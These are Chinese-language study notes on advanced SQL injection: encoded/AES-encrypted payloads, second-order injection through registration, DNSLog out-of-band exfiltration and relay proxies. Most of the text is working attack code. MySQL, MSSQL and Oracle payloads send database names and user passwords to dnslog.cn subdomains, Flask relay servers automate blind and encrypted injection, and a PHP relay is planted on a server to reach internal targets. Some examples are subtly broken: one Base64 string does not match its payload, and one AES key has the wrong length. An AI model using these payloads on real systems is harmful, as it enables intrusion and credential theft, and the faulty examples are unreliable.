# 2026-07-29 高级注入拓展 — 加密注入 / 二次注入 / DNSLog注入 / 中转注入

## 一、加密注入

### 1.1 原理

应用程序在将用户输入传给数据库之前做了**加密/编码处理**，但加密前的原始输入仍存在注入漏洞。直接发 SQL 语句会被当作明文处理，需要**将 Payload 先加密再发送**。

### 1.2 常见加密/编码场景

| 场景 | 举例 | 注入方案 |
|------|------|---------|
| Base64 编码传参 | `?id=LTEnIFVOSU9OIFNFTEVD` | 先 Base64 编码 Payload 再发送 |
| AES/DES 加密传参 | `?data=AES_encrypted_string` | 需要知道密钥和加密算法 |
| MD5/SHA 绕过（弱类型） | `?token=md5(password)` | Hash 无法解密，用别的注入点 |
| 前端 JS 加密后传输 | 登陆密码 AES 加密再 POST | 后端解密后再拼接 SQL → 注入在解密之后 |
| 自定义算法混淆 | XOR、字符移位等 | 逆向分析加密算法后构造 Payload |

### 1.3 Base64 编码注入

```sql
-- 原始注入 Payload
-1' UNION SELECT 1,2,3 --

-- Base64 编码后
LTEnIFVOSU9OIFNFTEVDVCBFTlVNU30gMSwyLDMgLS0g

-- GET 请求变为
?id=LTEnIFVOSU9OIFNFTEVDVCBFTlVNU30gMSwyLDMgLS0g
```

**利用脚本：**
```python
import base64

payload = "-1' UNION SELECT 1,2,3 -- "
# 注意：要根据后端 SQL 拼接方式决定是否保留空格
encoded = base64.b64encode(payload.encode()).decode()
print(encoded)

# 如果有 = 号的，URL 编码处理
import urllib.parse
url_payload = urllib.parse.quote(encoded)
print(url_payload)
```

**注意点：**
- 有些后端先解码再做其他处理，注意 `=` 填充符可能被过滤
- 如果空格、引号等被 Base64 前的 WAF 拦截，先编码即可绕过

### 1.4 AES/DES 加密注入

```python
# 前提：你需要知道密钥(key)和加密模式(ECB/CBC等)
from Crypto.Cipher import AES
import base64

key = b'known_key_16byte'  # 通过JS逆向找到的密钥
cipher = AES.new(key, AES.MODE_ECB)

# 构造 Payload
payload = "-1' UNION SELECT 1,2,3 -- "
# 补齐到 16 的倍数
payload = payload + (16 - len(payload) % 16) * ' '
encrypted = cipher.encrypt(payload.encode())
encoded = base64.b64encode(encrypted).decode()

print(encoded)
```

**如何获取密钥：**
```
1. 前端 JS 调试：搜索 encrypt / AES / CryptoJS 关键字
2. APP 逆向：反编译 APK 找加密逻辑
3. 抓包对比：已知明文 → 观察加密结果，推测算法
4. 配置文件泄露：.js .map 文件可能包含密钥
```

### 1.5 前端 JS 加密的注入思路

```
1. 找到加密函数（如 CryptoJS.AES.encrypt）
2. 提取密钥和 IV
3. 编写本地加密脚本
4. 把 SQL Payload 加密后替换到请求参数中
5. 或用 Python requests 代替浏览器发包

流程：
抓包看到密文 → 定位前端加密 JS → 提取密钥 → 
Python 复现加密 → 加密 Payload → 发包注入
```

### 1.6 URL 编码绕过（双编码注入）

```sql
-- 单次 URL 编码
'  →  %27
-- 如果后端自动解码一次后再拼接 SQL，直接发 %27 就行

-- 双次 URL 编码（后端二次解码场景）
'  →  %27  →  %2527
-- 第一次解码 → %27，第二次解码 → '

-- 实际注入
?id=1%2527%20UNION%20SELECT%201,2,3%20--%20
```

### 1.7 Hex/ASCII 编码注入

```sql
-- MySQL 的 INTO OUTFILE路径 hex 绕过
SELECT LOAD_FILE(0x2f6574632f706173737764)

-- 表名/库名 hex 绕过引号过滤
SELECT table_name FROM information_schema.tables WHERE table_schema=0x64625F6E616D65

-- 整个查询 ASCII 编码（某些 ORM 注入场景）
```

---

## 二、二次注入

### 2.1 原理

**二次注入（Second-Order SQL Injection）** 是指攻击者提交的恶意数据**不直接触发 SQL 注入**，而是先被存入数据库，之后在其他功能读取该数据时，由于未做过滤直接拼入 SQL，触发注入。

```
第一次请求：提交恶意数据 → 存入数据库（此时不触发注入）
第二次请求：其他功能读取数据 → 拼接进SQL（此时触发注入！）
```

### 2.2 典型场景

```
场景1：注册恶意用户名 → 修改密码时触发
  注册: username = admin' -- 
  存库: INSERT INTO users VALUES ('admin'' -- ', ...)
  修改密码: UPDATE users SET password='new' WHERE username='admin' -- '
  → username变成了 admin' -- ，闭合后注释掉后面，导致修改了 admin 的密码

场景2：发表恶意文章标题 → 管理员查看列表触发
  发文章: title = test' UNION SELECT ...
  管理员后台查看: SELECT * FROM articles WHERE title='test' UNION SELECT ...
  → 管理员浏览时触发注入

场景3：上传恶意文件名 → 文件列表页面触发
  上传文件: 1' OR updatexml(1,concat(0x7e,database()),1) OR '.jpg
  查看文件: SELECT * FROM files WHERE filename='1' OR updatexml...'
  → 查看文件列表时报错注入
```

### 2.3 二次注入实战步骤

**场景：注册处二次注入修改管理员密码**

```
Step 1: 在注册页面注册恶意用户名
  username = admin' -- 
  password = 123456
  → 数据入库: INSERT INTO users VALUES ('admin'' -- ', '123456')

Step 2: 登录该账号，进入修改密码页面
  修改密码 SQL: UPDATE users SET password='新密码' WHERE username='当前用户名'
  实际执行: UPDATE users SET password='新密码' WHERE username='admin' -- '
  生效部分: UPDATE users SET password='新密码' WHERE username='admin'
  
Step 3: admin 的密码被修改！攻击者用新密码登录 admin 账号
```

**场景：注入获取数据**

```
Step 1: 注册
  username = test' OR updatexml(1, concat(0x7e, database()), 1) OR '

Step 2: 管理员在后台查看用户列表
  SELECT * FROM users WHERE username LIKE '%test' OR updatexml(1, concat(0x7e, database()), 1) OR '%'
  → 触发报错，泄露数据库名
```

### 2.4 二次注入 vs 普通注入

| 对比维度 | 普通注入 | 二次注入 |
|---------|---------|---------|
| 触发时机 | 即时 | 延迟（先存后触发） |
| 触发位置 | 提交参数的当前页面 | 其他功能读取数据的位置 |
| 过滤绕过 | 绕过输入过滤 | 绕过输出过滤（存的时候转义了，取的时候没有） |
| 排查难度 | ★★ | ★★★★ |
| 常见位置 | GET/POST参数 | 注册/留言/上传/修改资料 |

### 2.5 二次注入的关键特征

```
1. 数据存入时做了转义（addslashes / mysql_real_escape_string）
2. 数据取出时没有再次转义就直接拼入 SQL
3. 触发点在另一个完全不相关的功能模块
4. 后端代码信任了"数据库里出来的数据是安全的"
```

### 2.6 防御要点

```
1. 永远不要信任数据库里取出来的数据
2. 使用参数化查询/预编译 — 从根本上杜绝
3. 存入时转义 ≠ 安全，取出后拼接同样需要转义
```

---

## 三、DNSLog 注入（DNS 外带注入）

### 3.1 原理

当 SQL 注入点**无回显且无状态差异**时（即报错、布尔、延时都用不了），可通过 DNS 协议将数据"带出"：

```
数据库发起 UNC 路径解析请求
→ DNS 服务器收到 xxx.dnslog.cn 的查询
→ DNSLog 平台记录子域名信息
→ 攻击者查看 DNS 日志获取数据
```

### 3.2 工作流程

```
[攻击者]                          [目标服务器]                    [DNSLog平台]
   │                                   │                              │
   │── 获取 DNSLog 子域名 ─────────────│─────────────────────────────▶│
   │   (如 abc123.dnslog.cn)          │                              │
   │                                   │                              │
   │── 发送注入 Payload ─────────────▶│                              │
   │   (拼接数据到子域名前面)          │                              │
   │                                   │                              │
   │                                   │── load_file(UNC路径) ──────▶│
   │                                   │   发起 DNS 查询              │
   │                                   │   (数据在子域名中)           │
   │                                   │                              │
   │◀────────────────────────── 查看 DNS 日志，提取数据 ───────────│
```

### 3.3 MySQL DNSLog 注入

**前提条件：**
```
1. Windows 操作系统（才支持 UNC 路径 \\）
2. secure_file_priv 为空（允许任意路径读取）
3. 用户具有 FILE 权限
4. 目标服务器能出网
```

**核心 Payload：**
```sql
-- 基本结构
SELECT LOAD_FILE(CONCAT('\\\\', (子查询), '.你的域名.dnslog.cn\\abc'))

-- 实际注入中
?id=1' AND LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.abc123.dnslog.cn\\abc')) -- 

-- 注意：四个反斜杠 \\\\ 因为在 SQL 中 \\ 表示一个 \
-- 最终构造的是 Windows UNC 路径：\\data.abc123.dnslog.cn\abc
```

**逐级获取数据：**
```sql
-- 1. 查数据库名
AND LOAD_FILE(CONCAT('\\\\', database(), '.xxx.dnslog.cn\\abc'))

-- 2. 查表名 (hex 编码，因为 group_concat 有逗号等特殊字符)
AND LOAD_FILE(CONCAT('\\\\', (SELECT hex(group_concat(table_name)) FROM information_schema.tables WHERE table_schema=database()), '.xxx.dnslog.cn\\abc'))
-- 在 DNSLog 看到 hex 值，解码即可

-- 3. 查字段名 (用 separator 替代逗号)
AND LOAD_FILE(CONCAT('\\\\', (SELECT group_concat(column_name separator '_') FROM information_schema.columns WHERE table_name='users'), '.xxx.dnslog.cn\\abc'))

-- 4. 逐行查数据 (UNC 路径最长 128 字符，必须逐行)
AND LOAD_FILE(CONCAT('\\\\', (SELECT concat(username, '~', password) FROM users LIMIT 0,1), '.xxx.dnslog.cn\\abc'))

AND LOAD_FILE(CONCAT('\\\\', (SELECT concat(username, '~', password) FROM users LIMIT 1,1), '.xxx.dnslog.cn\\abc'))
```

**为什么需要 hex 编码：**
```
group_concat 默认用逗号拼接 → DNS 域名不能包含逗号
解决办法：
  1. hex() 编码后查看
  2. separator 指定其他分隔符
  3. 特殊字符问题（@ 符号等）也用 hex 处理
```

### 3.4 MSSQL DNSLog 注入

```sql
-- MSSQL 用 xp_dirtree 或 xp_fileexist
-- 基本结构
DECLARE @a VARCHAR(1024);
SET @a = CONCAT('\\\\', (子查询), '.xxx.dnslog.cn\\abc');
EXEC master..xp_dirtree @a;

-- 注入中（堆叠查询）
; DECLARE @a VARCHAR(1024); SET @a=CONCAT('\\\\', db_name(), '.xxx.dnslog.cn\\abc'); EXEC master..xp_dirtree @a; --

-- 逐行获取表名
; DECLARE @a VARCHAR(1024); SET @a=CONCAT('\\\\', (SELECT top 1 name FROM sysobjects WHERE xtype='U'), '.xxx.dnslog.cn\\abc'); EXEC master..xp_dirtree @a; --

-- 获取字段
; DECLARE @a VARCHAR(1024); SET @a=CONCAT('\\\\', (SELECT top 1 name FROM syscolumns WHERE id=object_id('users')), '.xxx.dnslog.cn\\abc'); EXEC master..xp_dirtree @a; --
```

### 3.5 Oracle DNSLog 注入

```sql
-- Oracle 用 utl_http.request 或 utl_inaddr.get_host_addr
SELECT utl_http.request('http://'||(子查询)||'.xxx.dnslog.cn/') FROM dual

-- 或 DNS 方式
SELECT utl_inaddr.get_host_addr((子查询)||'.xxx.dnslog.cn') FROM dual
```

### 3.6 DNSLog 注入优劣

| 优点 | 缺点 |
|------|------|
| 速度快（比延时注入快太多） | 需要目标能出网 |
| 适合无回显场景 | MySQL 仅限 Windows |
| 一条请求获取多个字符 | 域名长度限制（253字符） |
| 可绕过大部分 WAF | 需要 FILE 权限 / xp_dirtree 等 |

### 3.7 DNSLog 常用平台速查

| 平台 | 地址 | 特点 |
|------|------|------|
| dnslog.cn | http://dnslog.cn | 国内首选，免注册 |
| Ceye.io | http://ceye.io | DNS + HTTP 双模式 |
| Burp Collaborator | Burp Suite 内置 | 渗透标配 |

---

## 四、中转注入

### 4.1 原理

**中转注入**是指在注入点和攻击者之间设置一个**中间脚本/代理**，用于：
- 绕过 IP 限制（攻击者服务器做跳板）
- 处理复杂的编码/加密转换
- WAF 自动化绕过
- 盲注数据中转回显

简单说就是：**本地写个脚本 → 脚本发包给目标 → 脚本解析结果 → 返回给你**。

### 4.2 适用场景

```
1. 有 IP 白名单限制
   → 拿一台在白名单内的服务器做中转

2. 需要复杂的数据处理（如 AES 加密注入）
   → 中转脚本自动完成加密+发包

3. 自动化盲注（本地脚本太慢，服务器端跑更快）
   → 把注入脚本放在 VPS 上跑

4. Cookie/Session 注入
   → 中转脚本维持会话状态

5. 盲注回显优化
   → 中转脚本做二分法、缓存等优化

6. WAF 绕过
   → 中转脚本自动变换 Payload 编码方式
```

### 4.3 SQLMap 中转脚本（tamper 脚本）

SQLMap 的 `--tamper` 参数本质就是一种中转处理：

```bash
# 常用 tamper 脚本
sqlmap -u "http://target.com?id=1" --tamper=space2comment   # 空格→/**/
sqlmap -u "http://target.com?id=1" --tamper=between          # = → BETWEEN
sqlmap -u "http://target.com?id=1" --tamper=base64encode     # Base64编码
sqlmap -u "http://target.com?id=1" --tamper=charencode       # 字符 char() 编码

# 组合多个 tamper
sqlmap -u "http://target.com?id=1" --tamper=space2comment,randomcase,charencode
```

### 4.4 自定义 Python 中转脚本

#### 基础版：盲注中转

```python
# relay_blind.py
# 在 VPS 上运行，本地请求它，它转发给目标并返回结果
import requests
from flask import Flask, request

app = Flask(__name__)
TARGET = "http://target.com/vuln.php"

@app.route('/check')
def check():
    pos = request.args.get('pos')
    ascii_val = request.args.get('ascii')
    
    payload = f"?id=1' AND ascii(substr(database(),{pos},1))={ascii_val} -- "
    r = requests.get(TARGET + payload)
    
    if "正常内容" in r.text:
        return "1"   # true
    else:
        return "0"   # false

app.run(host='0.0.0.0', port=8888)
```

本地盲注脚本调用中转：
```python
# 本地通过中转注入
import requests

RELAY = "http://your-vps:8888/check"
result = ""

for pos in range(1, 20):
    for ascii_val in range(32, 127):
        r = requests.get(f"{RELAY}?pos={pos}&ascii={ascii_val}")
        if r.text == "1":
            result += chr(ascii_val)
            print(result)
            break
```

#### 加密中转版

```python
# relay_encrypt.py
import requests
from flask import Flask, request
from Crypto.Cipher import AES
import base64

app = Flask(__name__)
TARGET = "http://target.com/api/data"
KEY = b'extracted_key_16b'  # 从JS逆向提取的密钥

def encrypt_payload(sql_payload):
    cipher = AES.new(KEY, AES.MODE_ECB)
    pad_len = 16 - len(sql_payload) % 16
    payload_padded = sql_payload + ' ' * pad_len
    encrypted = cipher.encrypt(payload_padded.encode())
    return base64.b64encode(encrypted).decode()

@app.route('/inject')
def inject():
    sql = request.args.get('sql')
    encrypted = encrypt_payload(sql)
    r = requests.post(TARGET, json={"data": encrypted})
    return r.text

app.run(host='0.0.0.0', port=8888)
```

#### DNSLog 中转版

```python
# relay_dnslog.py
# 把 DNSLog 结果转成 HTTP 接口，方便自动化
import requests
from flask import Flask

app = Flask(__name__)
DNSLOG_API = "http://dnslog.cn/api/get_records?domain=xxx"

@app.route('/get_dns_data')
def get_dns_data():
    r = requests.get(DNSLOG_API)
    return r.json()

app.run(host='0.0.0.0', port=8888)
```

### 4.5 文件上传后门型中转

```php
// relay.php - 上传到目标同网段的服务器上
<?php
$url = "http://内网目标/注入点.php?id=" . $_GET['payload'];
echo file_get_contents($url);
?>
```

用这个中转可以：
- 绕过 IP 白名单（中转服务器在允许范围内）
- 绕过 CORS 限制
- 探测内网资源

### 4.6 中转注入的作用总结

```
1. 隐蔽攻击源 IP — VPS 发包，本地不暴露
2. 绕过 IP 白名单 — 用白名单内的机器做跳板
3. 自动化编码处理 — 中转脚本负责加密/编码
4. 会话维持 — 中转脚本维护 Cookie/Session
5. 分布式注入 — 多台中转机并发跑盲注（提速10倍）
6. WAF 对抗 — 中转脚本自动切换 Payload 变形
```

---

## 五、四种注入方式对比总结

| 对比维度 | 加密注入 | 二次注入 | DNSLog注入 | 中转注入 |
|---------|---------|---------|-----------|---------|
| 核心思想 | Payload先加密再传 | 先存后触发 | DNS协议带数据 | 中间代理转发 |
| 触发方式 | 即时 | 延迟 | 即时 | 即时 |
| 绕过对象 | 参数过滤/编码 | 输入转义 | 无回显限制 | IP/编码限制 |
| 前提条件 | 知道加密算法和密钥 | 数据两次进出数据库 | 出网+Windows+FILE权限 | 有可控服务器 |
| 探测难度 | ★★★ | ★★★★ | ★★★ | ★★★ |
| 实战频率 | ★★★ | ★★ | ★★★ | ★★ |

---

## 六、实际攻防中的组合拳

```
1. 发现注入点但有 Base64 编码 → 加密注入（先编码Payload）
2. 注入无回显、无差异、靶机 Windows → DNSLog 注入
3. 目标有 IP 白名单 → 中转注入（VPS跳板）
4. 只能注册和查看用户 → 二次注入（注册恶意用户名）
5. 注入点有 AES 加密 + 无回显 + IP限制 →
   加密注入 + DNSLog注入 + 中转注入 三者组合
```

---

> **要点：**
> - **加密注入**：把 Payload 用目标同样的加密方式处理后再发送，关键是逆向获取加密算法和密钥
> - **二次注入**：恶意数据先入库（不触发），后续其他功能读取拼接 SQL 时触发（最隐蔽）
> - **DNSLog 注入**：将查询结果拼接在 DNS 域名中通过 DNS 协议外带，突破无回显盲注困境
> - **中转注入**：借助中间服务器处理复杂逻辑或绕过网络限制，本质是"注入自动化代理"
